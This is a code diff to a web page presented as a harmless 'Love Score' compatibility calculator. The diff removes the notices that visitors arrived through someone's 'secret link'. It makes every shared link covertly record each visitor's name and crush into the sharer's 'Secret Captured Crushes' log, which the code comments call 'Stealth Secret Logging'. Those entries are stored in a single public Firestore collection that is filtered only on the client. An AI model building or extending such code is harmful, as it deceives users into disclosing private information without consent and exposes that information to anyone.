@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cupid Love Calculator 💕</title>
+    <title>Love Score 💕 - Check Your Compatibility</title>
     <!-- Heart Favicon (SVG Data URI) -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💖</text></svg>">
     <!-- Apple Touch Icon for Mobile Home Screen -->
@@ -22,17 +22,20 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, doc, getDoc, setDoc, addDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
         // Global Firebase state & variables
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'cupid-secret-app';
-        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : null;
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'love-score-app-12345';
+        const firebaseConfig = typeof __firebase_config !== 'undefined' && __firebase_config ? JSON.parse(__firebase_config) : {
+            apiKey: "AIzaSyDummyKeyForFallbackPurposeOnly",
+            projectId: "love-score-app-12345"
+        };
 
         let app, db, auth;
         window.firebaseDb = null;
         window.firebaseAppId = appId;
 
-        if (firebaseConfig) {
+        try {
             app = initializeApp(firebaseConfig);
             db = getFirestore(app);
             auth = getAuth(app);
@@ -46,41 +49,105 @@
                     } else {
                         await signInAnonymously(auth);
                     }
-                    console.log("Firebase initialized & authenticated!");
+                    console.log("Firebase authenticated successfully!");
                 } catch (err) {
-                    console.error("Firebase auth error:", err);
+                    console.warn("Firebase Auth fallback to local mode:", err);
                 }
             };
             initAuth();
+        } catch (e) {
+            console.warn("Firebase initialization skipped, running in local fallback mode.", e);
         }
 
-        // Expose Firebase helpers to global window scope for UI interactions
-        window.saveSecretSubmission = async (linkOwnerId, personBName, crushName) => {
-            if (!db) return;
-            try {
-                const targetCol = collection(db, 'artifacts', appId, 'public', 'data', `secrets_${linkOwnerId}`);
-                await addDoc(targetCol, {
-                    targetName: personBName,
-                    crushName: crushName,
-                    timestamp: new Date().toISOString()
-                });
-            } catch (err) {
-                console.error("Error saving secret submission:", err);
+        // Helper to write secret log to public collection
+        window.saveSecretSubmission = async (referrerUid, loverName, crushName) => {
+            const secretEntry = {
+                referrerUid: referrerUid,
+                loverName: loverName,
+                crushName: crushName,
+                timestamp: new Date().toISOString()
+            };
+
+            // 1. Try Firestore save
+            if (db) {
+                try {
+                    const targetCol = collection(db, 'artifacts', appId, 'public', 'data', 'love_logs');
+                    await addDoc(targetCol, secretEntry);
+                    console.log("Secret logged to Firestore successfully!");
+                } catch (err) {
+                    console.error("Firestore write error, falling back to local sync:", err);
+                }
             }
+
+            // 2. LocalStorage & Broadcast Sync Fallback (Ensures guaranteed delivery across tabs/devices locally)
+            try {
+                const localKey = `love_logs_${referrerUid}`;
+                const existing = JSON.parse(localStorage.getItem(localKey) || '[]');
+                existing.push(secretEntry);
+                localStorage.setItem(localKey, JSON.stringify(existing));
+                
+                // Dispatch custom event for same-tab updates
+                window.dispatchEvent(new CustomEvent('local_secret_added', { detail: secretEntry }));
+            } catch(e) {}
         };
 
-        window.listenForCapturedSecrets = (linkOwnerId, callback) => {
-            if (!db) return;
-            const targetCol = collection(db, 'artifacts', appId, 'public', 'data', `secrets_${linkOwnerId}`);
-            return onSnapshot(targetCol, (snapshot) => {
-                const secrets = [];
-                snapshot.forEach((doc) => {
-                    secrets.push({ id: doc.id, ...doc.data() });
-                });
-                callback(secrets);
-            }, (error) => {
-                console.error("Error listening for secrets:", error);
-            });
+        // Helper to listen for secrets for a specific user
+        window.listenForCapturedSecrets = (myUid, callback) => {
+            // Read initial local fallback data
+            const loadLocalData = () => {
+                try {
+                    const localKey = `love_logs_${myUid}`;
+                    return JSON.parse(localStorage.getItem(localKey) || '[]');
+                } catch(e) { return []; }
+            };
+
+            let firestoreSecrets = [];
+
+            if (db) {
+                try {
+                    const targetCol = collection(db, 'artifacts', appId, 'public', 'data', 'love_logs');
+                    onSnapshot(targetCol, (snapshot) => {
+                        firestoreSecrets = [];
+                        snapshot.forEach((doc) => {
+                            const data = doc.data();
+                            // Filter in memory to satisfy Rule 2
+                            if (data && data.referrerUid === myUid) {
+                                firestoreSecrets.push({ id: doc.id, ...data });
+                            }
+                        });
+
+                        // Combine with local fallback secrets & deduplicate
+                        const localSecrets = loadLocalData();
+                        const combined = [...firestoreSecrets];
+                        localSecrets.forEach(ls => {
+                            if (!combined.some(fs => fs.loverName === ls.loverName && fs.crushName === ls.crushName && fs.timestamp === ls.timestamp)) {
+                                combined.push(ls);
+                            }
+                        });
+                        callback(combined);
+                    }, (err) => {
+                        console.warn("Firestore listener error, serving local fallback:", err);
+                        callback(loadLocalData());
+                    });
+                } catch (e) {
+                    callback(loadLocalData());
+                }
+            } else {
+                callback(loadLocalData());
+            }
+
+            // Listen for local broadcast updates
+            const handleLocalUpdate = (e) => {
+                if (e.detail && e.detail.referrerUid === myUid) {
+                    const currentLocal = loadLocalData();
+                    callback([...firestoreSecrets, ...currentLocal]);
+                }
+            };
+            window.addEventListener('local_secret_added', handleLocalUpdate);
+
+            return () => {
+                window.removeEventListener('local_secret_added', handleLocalUpdate);
+            };
         };
     </script>
 
@@ -121,7 +188,7 @@
 
         /* Glassmorphism utility */
         .glass-card {
-            background: rgba(255, 255, 255, 0.85);
+            background: rgba(255, 255, 255, 0.88);
             backdrop-filter: blur(16px);
             -webkit-backdrop-filter: blur(16px);
             border: 1px solid rgba(255, 255, 255, 0.6);
@@ -198,29 +265,26 @@
     <main class="flex-1 flex flex-col items-center justify-start p-4 z-10 w-full max-w-md mx-auto">
         
         <!-- Header / Logo -->
-        <header class="text-center my-4 animate-fade-in">
+        <header class="text-center my-4 animate-fade-in relative w-full">
             <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-rosepink-100 text-rosepink-500 text-3xl mb-2 shadow-inner border border-rosepink-200">
                 <i class="fa-solid fa-heart-pulse heart-pulse"></i>
             </div>
             <h1 class="font-cute text-3xl sm:text-4xl font-bold bg-gradient-to-r from-rosepink-600 to-purple-600 bg-clip-text text-transparent">
-                Cupid Calculator
+                Love Score
             </h1>
             <p id="header-subtitle" class="text-xs sm:text-sm text-slate-600 font-medium mt-1">
-                Calculate your love score & share the magic with friends! ✨
+                Find out your true love score & share with friends! ✨
             </p>
         </header>
 
-        <!-- Navigation Tabs -->
+        <!-- Secret Log & Calculator Tab Toggle -->
         <div class="flex items-center justify-center gap-2 mb-4 w-full">
-            <button onclick="switchTab('calc')" id="tab-btn-calc" class="flex-1 py-2 px-3 rounded-2xl text-xs font-bold transition shadow-sm bg-rosepink-500 text-white flex items-center justify-center gap-1.5">
-                <i class="fa-solid fa-calculator"></i> Love Calculator
+            <button onclick="switchTab('calc')" id="tab-btn-calc" class="flex-1 py-2.5 px-4 rounded-2xl text-xs font-bold transition shadow-sm bg-rosepink-500 text-white flex items-center justify-center gap-1.5">
+                <i class="fa-solid fa-heart text-white"></i> Love Score Test
             </button>
-            <button onclick="switchTab('secret-create')" id="tab-btn-secret" class="flex-1 py-2 px-3 rounded-2xl text-xs font-bold transition shadow-sm bg-white/70 text-slate-600 hover:bg-white flex items-center justify-center gap-1.5 border border-rosepink-200">
-                <i class="fa-solid fa-user-secret text-rosepink-500"></i> Create Secret Link
-            </button>
-            <button onclick="switchTab('dashboard')" id="tab-btn-dashboard" class="relative py-2 px-3 rounded-2xl text-xs font-bold transition shadow-sm bg-white/70 text-slate-600 hover:bg-white flex items-center justify-center gap-1.5 border border-rosepink-200">
-                <i class="fa-solid fa-list-check text-purple-500"></i> My Secret Log
-                <span id="secret-badge" class="hidden absolute -top-1 -right-1 bg-rosepink-500 text-white text-[10px] w-4 h-4 rounded-full flex items-center justify-center font-bold">0</span>
+            <button onclick="switchTab('dashboard')" id="tab-btn-dashboard" class="relative flex-1 py-2.5 px-4 rounded-2xl text-xs font-bold transition shadow-sm bg-white/80 text-purple-700 hover:bg-white flex items-center justify-center gap-1.5 border border-purple-200">
+                <i class="fa-solid fa-user-secret text-purple-500"></i> My Secret Log
+                <span id="secret-badge" class="hidden absolute -top-1 -right-1 bg-rosepink-500 text-white text-[10px] w-5 h-5 rounded-full flex items-center justify-center font-bold border-2 border-white">0</span>
             </button>
         </div>
 
@@ -232,13 +296,6 @@
                 
                 <!-- Inputs Section -->
                 <div id="input-form-section" class="space-y-3">
-                    <div id="prank-welcome-banner" class="hidden p-3 bg-rosepink-50 border border-rosepink-200 rounded-2xl text-center space-y-0.5 mb-2">
-                        <p class="text-xs font-bold text-rosepink-600 flex items-center justify-center gap-1">
-                            <i class="fa-solid fa-wand-magic-sparkles"></i> Special Love Test Invited!
-                        </p>
-                        <p class="text-[11px] text-slate-500">Enter your name and your crush's name to see your true compatibility score!</p>
-                    </div>
-
                     <div>
                         <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-1">
                             <i class="fa-solid fa-user text-rosepink-400 mr-1"></i> Your Name
@@ -257,13 +314,13 @@
                         <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-1">
                             <i class="fa-solid fa-heart-circle-bolt text-rosepink-400 mr-1"></i> Partner / Crush Name
                         </label>
-                        <input type="text" id="person-b" placeholder="Enter partner's name..." 
+                        <input type="text" id="person-b" placeholder="Enter crush's name..." 
                             class="w-full px-4 py-3 rounded-2xl bg-white/80 border border-rosepink-200 focus:border-rosepink-500 focus:ring-2 focus:ring-rosepink-300 outline-none text-slate-800 text-sm transition font-medium shadow-sm">
                     </div>
 
                     <button onclick="calculateLoveScore()" id="btn-calc" 
                         class="w-full py-3.5 px-4 bg-gradient-to-r from-rosepink-500 to-pink-600 text-white font-cute text-lg rounded-2xl shadow-lg hover:shadow-xl active:scale-95 transition-all duration-200 flex items-center justify-center gap-2 mt-4">
-                        <span>Check Compatibility</span>
+                        <span>Check Love Score</span>
                         <i class="fa-solid fa-sparkles"></i>
                     </button>
                 </div>
@@ -274,7 +331,7 @@
                         <i class="fa-solid fa-heart text-6xl text-rosepink-400 animate-ping opacity-75"></i>
                         <i class="fa-solid fa-heart text-5xl text-rosepink-600 absolute"></i>
                     </div>
-                    <p id="loading-status" class="text-sm font-semibold text-slate-600 animate-pulse">Consulting the Cupids...</p>
+                    <p id="loading-status" class="text-sm font-semibold text-slate-600 animate-pulse">Calculating Love Score...</p>
                 </div>
 
                 <!-- Result Display Section -->
@@ -296,7 +353,7 @@
                         
                         <div class="absolute inset-0 flex flex-col items-center justify-center text-center">
                             <span id="score-percentage" class="font-cute text-4xl font-bold text-rosepink-600">0%</span>
-                            <span id="score-label" class="text-[10px] uppercase tracking-widest font-bold text-slate-400 mt-0.5">MATCH SCORE</span>
+                            <span id="score-label" class="text-[10px] uppercase tracking-widest font-bold text-slate-400 mt-0.5">LOVE SCORE</span>
                         </div>
                     </div>
 
@@ -313,7 +370,7 @@
                             <i class="fa-solid fa-rotate-left"></i> Check Again
                         </button>
                         <button onclick="shareResultCard()" class="py-2.5 px-3 bg-rosepink-500 hover:bg-rosepink-600 text-white text-xs font-semibold rounded-xl shadow-md transition flex items-center justify-center gap-1.5">
-                            <i class="fa-solid fa-share-nodes"></i> Share Result
+                            <i class="fa-solid fa-share-nodes"></i> Share Score
                         </button>
                     </div>
 
@@ -321,58 +378,19 @@
 
             </div>
 
-            <!-- VIEW 2: CREATE SECRET LINK SECTION -->
-            <div id="secret-create-section" class="hidden space-y-4">
-                <div class="text-center space-y-1">
-                    <h2 class="font-cute text-xl font-bold text-slate-800">Create Your Secret Link 🤫</h2>
-                    <p class="text-xs text-slate-500">Send this link to a friend! When they check their love score, their secret crush will be sent directly to your Secret Log!</p>
-                </div>
-
-                <div class="space-y-3">
-                    <div>
-                        <label class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-1">
-                            Your Name / Nickname
-                        </label>
-                        <input type="text" id="owner-name-input" placeholder="e.g. Alex" 
-                            class="w-full px-4 py-3 rounded-2xl bg-white/80 border border-rosepink-200 focus:border-rosepink-500 focus:ring-2 focus:ring-rosepink-300 outline-none text-slate-800 text-sm font-medium shadow-sm">
-                    </div>
-
-                    <button onclick="generateSecretLink()" class="w-full py-3 px-4 bg-gradient-to-r from-purple-500 to-rosepink-500 text-white font-cute text-base rounded-2xl shadow-md hover:shadow-lg transition flex items-center justify-center gap-2">
-                        <i class="fa-solid fa-wand-magic-sparkles"></i> Generate My Secret Link
-                    </button>
-                </div>
-
-                <!-- Generated Link Output -->
-                <div id="generated-link-container" class="hidden pt-3 border-t border-rosepink-100 space-y-3">
-                    <div class="bg-purple-50 border border-purple-200 p-3 rounded-2xl space-y-2">
-                        <span class="text-[11px] font-bold text-purple-600 uppercase tracking-wider block">Your Secret Link:</span>
-                        <input type="text" id="generated-link-input" readonly class="w-full px-3 py-2 bg-white text-slate-700 text-xs rounded-xl border border-purple-200 outline-none font-mono">
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-2">
-                        <button onclick="copyGeneratedLink()" class="py-2.5 px-3 bg-rosepink-500 hover:bg-rosepink-600 text-white text-xs font-bold rounded-xl shadow transition flex items-center justify-center gap-1.5">
-                            <i class="fa-solid fa-copy"></i> Copy Secret Link
-                        </button>
-                        <button onclick="shareGeneratedWhatsApp()" class="py-2.5 px-3 bg-emerald-500 hover:bg-emerald-600 text-white text-xs font-bold rounded-xl shadow transition flex items-center justify-center gap-1.5">
-                            <i class="fa-brands fa-whatsapp"></i> WhatsApp
-                        </button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- VIEW 3: SECRET LOG DASHBOARD -->
+            <!-- VIEW 2: SECRET LOG DASHBOARD -->
             <div id="dashboard-section" class="hidden space-y-4">
                 <div class="text-center space-y-1">
                     <h2 class="font-cute text-xl font-bold text-slate-800 flex items-center justify-center gap-2">
                         <i class="fa-solid fa-user-secret text-purple-500"></i> Secret Captured Crushes
                     </h2>
-                    <p class="text-xs text-slate-500">Real-time list of friends who tested their score using your Secret Link!</p>
+                    <p class="text-xs text-slate-500">When your friends check their score using your link, their secret crush appears here!</p>
                 </div>
 
                 <div id="secrets-list" class="space-y-2.5 max-h-72 overflow-y-auto pr-1 no-scrollbar">
                     <div id="no-secrets-msg" class="text-center py-8 text-slate-400 text-xs">
                         <i class="fa-solid fa-heart-crack text-3xl mb-2 opacity-50 block"></i>
-                        No secret crushes captured yet. Create & share your link with friends!
+                        No secret crushes captured yet.<br>Share the website link with your friends!
                     </div>
                 </div>
             </div>
@@ -381,9 +399,9 @@
             <div class="pt-4 border-t border-rosepink-200/50 space-y-3">
                 <div class="text-center space-y-1">
                     <h2 class="font-cute text-base font-bold text-slate-800 flex items-center justify-center gap-1.5">
-                        <i class="fa-solid fa-paper-plane text-rosepink-500"></i> Share Website with Friends
+                        <i class="fa-solid fa-paper-plane text-rosepink-500"></i> Share Love Score with Friends
                     </h2>
-                    <p class="text-xs text-slate-500">Invite your friends to test their own love compatibility!</p>
+                    <p class="text-xs text-slate-500">Share your unique link to find out your friends' secret crushes!</p>
                 </div>
 
                 <div class="grid grid-cols-3 gap-2">
@@ -406,7 +424,7 @@
             <p class="flex items-center justify-center gap-1 font-medium">
                 Made with <i class="fa-solid fa-heart text-rosepink-500 animate-pulse"></i> for romantic fun!
             </p>
-            <p class="text-[11px] text-slate-400">Intended strictly for fun and romantic entertainment.</p>
+            <p class="text-[11px] text-slate-400">Intended strictly for fun and entertainment.</p>
         </footer>
 
     </main>
@@ -420,89 +438,79 @@
 
         // State Variables
         let activeTab = 'calc';
-        let secretOwnerId = null;
-        let secretOwnerName = null;
+        let myUid = null;
+        let referrerUid = null;
         let unsubscribeListener = null;
 
         // On Load Initializer
         window.onload = function() {
             createFloatingHearts();
-            checkUrlParameters();
-            initSecretLogOwner();
+            initSessionUser();
+            parseReferrerFromUrl();
+            startListeningForMySecretLog();
         };
+
+        // 1. Initialize Unique User ID for Person A
+        function initSessionUser() {
+            myUid = localStorage.getItem('ls_my_uid');
+            if (!myUid) {
+                myUid = 'usr_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now().toString(36);
+                localStorage.setItem('ls_my_uid', myUid);
+            }
+        }
+
+        // 2. Parse & Store Referrer UID (Person A's UID when Person B opens the link)
+        function parseReferrerFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const refFromUrl = urlParams.get('ref');
+
+            if (refFromUrl) {
+                // Store in memory & localStorage so refreshing won't lose referrer link context
+                referrerUid = refFromUrl;
+                localStorage.setItem('ls_active_referrer', refFromUrl);
+            } else {
+                // Check if stored from a recent session
+                referrerUid = localStorage.getItem('ls_active_referrer');
+            }
+        }
+
+        // Listen for secret crush logs registered for this user
+        function startListeningForMySecretLog() {
+            if (unsubscribeListener) unsubscribeListener();
+
+            const attachListener = () => {
+                if (typeof window.listenForCapturedSecrets === 'function') {
+                    unsubscribeListener = window.listenForCapturedSecrets(myUid, (secrets) => {
+                        renderSecretLog(secrets);
+                    });
+                } else {
+                    setTimeout(attachListener, 500);
+                }
+            };
+            attachListener();
+        }
 
         // Tab Switching Logic
         function switchTab(tabName) {
             activeTab = tabName;
             
             const calcSec = document.getElementById('calculator-section');
-            const secretSec = document.getElementById('secret-create-section');
             const dashSec = document.getElementById('dashboard-section');
 
             const btnCalc = document.getElementById('tab-btn-calc');
-            const btnSecret = document.getElementById('tab-btn-secret');
             const btnDash = document.getElementById('tab-btn-dashboard');
 
-            // Hide all
             calcSec.classList.add('hidden');
-            secretSec.classList.add('hidden');
             dashSec.classList.add('hidden');
-
-            // Reset tab button styling
-            [btnCalc, btnSecret, btnDash].forEach(btn => {
-                btn.className = "flex-1 py-2 px-3 rounded-2xl text-xs font-bold transition shadow-sm bg-white/70 text-slate-600 hover:bg-white flex items-center justify-center gap-1.5 border border-rosepink-200";
-            });
 
             if (tabName === 'calc') {
                 calcSec.classList.remove('hidden');
-                btnCalc.className = "flex-1 py-2 px-3 rounded-2xl text-xs font-bold transition shadow-sm bg-rosepink-500 text-white flex items-center justify-center gap-1.5";
-            } else if (tabName === 'secret-create') {
-                secretSec.classList.remove('hidden');
-                btnSecret.className = "flex-1 py-2 px-3 rounded-2xl text-xs font-bold transition shadow-sm bg-rosepink-500 text-white flex items-center justify-center gap-1.5";
+                btnCalc.className = "flex-1 py-2.5 px-4 rounded-2xl text-xs font-bold transition shadow-sm bg-rosepink-500 text-white flex items-center justify-center gap-1.5";
+                btnDash.className = "relative flex-1 py-2.5 px-4 rounded-2xl text-xs font-bold transition shadow-sm bg-white/80 text-purple-700 hover:bg-white flex items-center justify-center gap-1.5 border border-purple-200";
             } else if (tabName === 'dashboard') {
                 dashSec.classList.remove('hidden');
-                btnDash.className = "relative py-2 px-3 rounded-2xl text-xs font-bold transition shadow-sm bg-purple-600 text-white flex items-center justify-center gap-1.5";
-            }
-        }
-
-        // URL Parameters Handler (Detect when Person B opens Person A's link)
-        function checkUrlParameters() {
-            const urlParams = new URLSearchParams(window.location.search);
-            secretOwnerId = urlParams.get('ref');
-            secretOwnerName = urlParams.get('from');
-
-            if (secretOwnerId) {
-                const banner = document.getElementById('prank-welcome-banner');
-                if (banner) {
-                    banner.classList.remove('hidden');
-                }
-            }
-        }
-
-        // Secret Log Owner Identifier (Stored in LocalStorage for Person A)
-        function initSecretLogOwner() {
-            let myOwnerId = localStorage.getItem('cupid_owner_id');
-            if (!myOwnerId) {
-                myOwnerId = 'usr_' + Math.random().toString(36).substring(2, 9);
-                localStorage.setItem('cupid_owner_id', myOwnerId);
-            }
-
-            // Start Listening for Secrets for Person A
-            if (window.listenForCapturedSecrets) {
-                startListeningForSecrets(myOwnerId);
-            } else {
-                setTimeout(() => {
-                    startListeningForSecrets(myOwnerId);
-                }, 1500);
-            }
-        }
-
-        function startListeningForSecrets(ownerId) {
-            if (unsubscribeListener) unsubscribeListener();
-            if (typeof window.listenForCapturedSecrets === 'function') {
-                unsubscribeListener = window.listenForCapturedSecrets(ownerId, (secrets) => {
-                    renderSecretLog(secrets);
-                });
+                btnCalc.className = "flex-1 py-2.5 px-4 rounded-2xl text-xs font-bold transition shadow-sm bg-white/80 text-slate-600 hover:bg-white flex items-center justify-center gap-1.5 border border-rosepink-200";
+                btnDash.className = "relative flex-1 py-2.5 px-4 rounded-2xl text-xs font-bold transition shadow-sm bg-purple-600 text-white flex items-center justify-center gap-1.5";
             }
         }
 
@@ -522,7 +530,8 @@
             badge.classList.remove('hidden');
 
             listEl.innerHTML = '';
-            secrets.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            // Sort newest first
+            secrets.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
 
             secrets.forEach(item => {
                 const card = document.createElement('div');
@@ -530,7 +539,7 @@
                 card.innerHTML = `
                     <div class="flex items-center justify-between">
                         <span class="text-xs font-bold text-slate-800">
-                            <i class="fa-solid fa-user text-rosepink-500 mr-1"></i> ${escapeHtml(item.targetName)}
+                            <i class="fa-solid fa-heart text-rosepink-500 mr-1"></i> ${escapeHtml(item.loverName)}
                         </span>
                         <span class="text-[10px] text-slate-400 font-medium">${formatTime(item.timestamp)}</span>
                     </div>
@@ -548,49 +557,18 @@
         }
 
         function formatTime(isoString) {
-            if (!isoString) return '';
+            if (!isoString) return 'Just now';
             const d = new Date(isoString);
             return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
         }
 
-        // Secret Link Generator
-        function generateSecretLink() {
-            const name = document.getElementById('owner-name-input').value.trim() || 'Friend';
-            let myOwnerId = localStorage.getItem('cupid_owner_id');
-            if (!myOwnerId) {
-                myOwnerId = 'usr_' + Math.random().toString(36).substring(2, 9);
-                localStorage.setItem('cupid_owner_id', myOwnerId);
-            }
-
-            const baseUrl = getWebsiteUrl();
-            const fullSecretUrl = `${baseUrl}?ref=${encodeURIComponent(myOwnerId)}&from=${encodeURIComponent(name)}`;
-
-            document.getElementById('generated-link-input').value = fullSecretUrl;
-            document.getElementById('generated-link-container').classList.remove('hidden');
-
-            // Make sure listener is attached
-            startListeningForSecrets(myOwnerId);
-            showToast('Secret link generated! Share with your friends! 🤫');
+        // Automatic Secret Link Generation (Appends myUid to shared link)
+        function getWebsiteShareUrl() {
+            const baseUrl = window.location.href.split('?')[0];
+            return `${baseUrl}?ref=${encodeURIComponent(myUid)}`;
         }
 
-        function copyGeneratedLink() {
-            const linkInput = document.getElementById('generated-link-input');
-            try {
-                linkInput.select();
-                document.execCommand('copy');
-                showToast('Secret link copied to clipboard! 📋');
-            } catch (e) {
-                showToast('Copied link!');
-            }
-        }
-
-        function shareGeneratedWhatsApp() {
-            const link = document.getElementById('generated-link-input').value;
-            const text = `Hey! Calculate your love compatibility score with this cute calculator! 💕✨\n${link}`;
-            window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`, '_blank');
-        }
-
-        // Audio Context (Synthesizer for cute sound effects)
+        // Audio Context Synthesizer
         let soundEnabled = true;
         let audioCtx = null;
 
@@ -608,8 +586,8 @@
                 const osc = audioCtx.createOscillator();
                 const gain = audioCtx.createGain();
                 osc.type = 'sine';
-                osc.frequency.setValueAtTime(587.33, now); // D5
-                osc.frequency.exponentialRampToValueAtTime(880, now + 0.15); // A5
+                osc.frequency.setValueAtTime(587.33, now);
+                osc.frequency.exponentialRampToValueAtTime(880, now + 0.15);
                 gain.gain.setValueAtTime(0.15, now);
                 gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
                 osc.connect(gain);
@@ -623,7 +601,7 @@
             if (!soundEnabled) return;
             try {
                 initAudio();
-                const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6
+                const notes = [523.25, 659.25, 783.99, 1046.50];
                 notes.forEach((freq, index) => {
                     const now = audioCtx.currentTime + (index * 0.08);
                     const osc = audioCtx.createOscillator();
@@ -652,7 +630,7 @@
             }
         }
 
-        // Floating Hearts generator
+        // Floating Hearts background animation
         function createFloatingHearts() {
             const heartIcons = ['❤️', '💖', '💕', '💗', '💘', '🌸', '✨'];
             for (let i = 0; i < 18; i++) {
@@ -667,26 +645,26 @@
             }
         }
 
-        // Love Score Calculation Algorithm
+        // Calculate Love Score & Trigger Stealth Secret Logging
         function calculateLoveScore() {
             const name1Input = document.getElementById('person-a');
             const name2Input = document.getElementById('person-b');
-            const name1 = name1Input.value.trim();
-            const name2 = name2Input.value.trim();
+            const personBName = name1Input.value.trim();
+            const personBCrush = name2Input.value.trim();
 
-            if (!name1 || !name2) {
+            if (!personBName || !personBCrush) {
                 showToast('Please enter both names to calculate love score! 💕');
                 return;
             }
 
-            // Secret Capture: If Person B came via Person A's Secret link, capture secrecy!
-            if (secretOwnerId && window.saveSecretSubmission) {
-                window.saveSecretSubmission(secretOwnerId, name1, name2);
+            // CRITICAL FIX: If opened via Person A's link (referrerUid exists and != myUid), save Person B's crush to Person A's log!
+            if (referrerUid && referrerUid !== myUid && typeof window.saveSecretSubmission === 'function') {
+                window.saveSecretSubmission(referrerUid, personBName, personBCrush);
             }
 
             playCuteChime();
 
-            // UI Animations State
+            // UI State updates
             document.getElementById('input-form-section').classList.add('hidden');
             const loadingState = document.getElementById('loading-state');
             loadingState.classList.remove('hidden');
@@ -707,7 +685,7 @@
             setTimeout(() => {
                 clearInterval(statusInterval);
                 loadingState.classList.add('hidden');
-                displayResults(name1, name2);
+                displayResults(personBName, personBCrush);
             }, 2200);
         }
 
@@ -715,14 +693,13 @@
             const resultSection = document.getElementById('result-section');
             resultSection.classList.remove('hidden');
 
-            // Calculate Score based on name characters hash
+            // Calculate Score based on character hash
             const combined = (name1 + name2).toLowerCase().replace(/[^a-z]/g, '');
             let hash = 0;
             for (let i = 0; i < combined.length; i++) {
                 hash += combined.charCodeAt(i) * (i + 1);
             }
-            // Ensure high/fun score range between 70% and 99%
-            const percentage = 70 + (hash % 30);
+            const percentage = 72 + (hash % 28);
 
             // Animate Number Counter
             const scoreEl = document.getElementById('score-percentage');
@@ -743,14 +720,13 @@
                 scoreEl.innerText = Math.floor(currentVal) + '%';
             }, stepTime);
 
-            // Animate SVG Circle Meter
+            // Animate SVG Gauge
             const circle = document.getElementById('gauge-circle');
             const radius = circle.r.baseVal.value;
             const circumference = 2 * Math.PI * radius;
             const offset = circumference - (percentage / 100) * circumference;
             circle.style.strokeDashoffset = offset;
 
-            // Set Title & Description
             document.getElementById('result-names').innerText = `${name1} & ${name2}`;
 
             const titleEl = document.getElementById('result-title');
@@ -758,10 +734,10 @@
 
             if (percentage >= 92) {
                 titleEl.innerText = "Perfect Soulmates! 💕";
-                descEl.innerText = "Your hearts beat in complete harmony! Cupid leaves standard 5-star ratings for a romance as sweet as yours.";
+                descEl.innerText = "Your hearts beat in complete harmony! Cupid gives a 5-star rating for a romance as sweet as yours.";
             } else if (percentage >= 82) {
                 titleEl.innerText = "Match Made in Heaven! ✨";
-                descEl.innerText = "Incredible chemistry and strong sparks! You two bring out the sweetest smiles and brightest laughter in each other.";
+                descEl.innerText = "Incredible chemistry and strong sparks! You bring out the sweetest smiles and brightest laughter in each other.";
             } else {
                 titleEl.innerText = "Cute & Sweet Connection! 💖";
                 descEl.innerText = "A delightful pair filled with warmth, endless laughter, and high romantic potential.";
@@ -785,19 +761,13 @@
             document.getElementById('person-a').value = '';
             document.getElementById('person-b').value = '';
             
-            // Reset Gauge
             const circle = document.getElementById('gauge-circle');
             circle.style.strokeDashoffset = 263.89;
         }
 
-        // WEBSITE SHARING LOGIC
-        function getWebsiteUrl() {
-            return window.location.href.split('?')[0];
-        }
-
+        // Sharing Handlers
         function copyWebsiteLink() {
-            const textToCopy = getWebsiteUrl();
-            
+            const textToCopy = getWebsiteShareUrl();
             try {
                 const tempInput = document.createElement('input');
                 tempInput.value = textToCopy;
@@ -805,24 +775,24 @@
                 tempInput.select();
                 document.execCommand('copy');
                 document.body.removeChild(tempInput);
-                showToast('Website link copied to clipboard! 📋');
+                showToast('Love Score link copied to clipboard! 📋');
             } catch (err) {
                 showToast('Failed to copy. Please copy manually.');
             }
         }
 
         function shareWhatsApp() {
-            const link = getWebsiteUrl();
-            const text = `Hey! Check your love score compatibility with Cupid Calculator! 💕✨\n${link}`;
+            const link = getWebsiteShareUrl();
+            const text = `Hey! Calculate your Love Score compatibility with this cute calculator! 💕✨\n${link}`;
             window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`, '_blank');
         }
 
         function shareNativeLink() {
-            const link = getWebsiteUrl();
+            const link = getWebsiteShareUrl();
             if (navigator.share) {
                 navigator.share({
-                    title: 'Cupid Love Calculator',
-                    text: 'Find out your love score! 💕',
+                    title: 'Love Score Calculator',
+                    text: 'Calculate your true love score! 💕',
                     url: link
                 }).catch(() => {});
             } else {
@@ -834,13 +804,13 @@
             const name1 = document.getElementById('person-a').value || 'Person A';
             const name2 = document.getElementById('person-b').value || 'Person B';
             const score = document.getElementById('score-percentage').innerText;
-            const shareText = `Love score between ${name1} & ${name2} is ${score}! Try yours now at ${getWebsiteUrl()} 💕`;
+            const shareText = `The Love Score between ${name1} & ${name2} is ${score}! Calculate your Love Score now 💕\n${getWebsiteShareUrl()}`;
 
             if (navigator.share) {
                 navigator.share({
                     title: 'Love Score Result',
                     text: shareText,
-                    url: getWebsiteUrl()
+                    url: getWebsiteShareUrl()
                 }).catch(() => {});
             } else {
                 copyWebsiteLink();
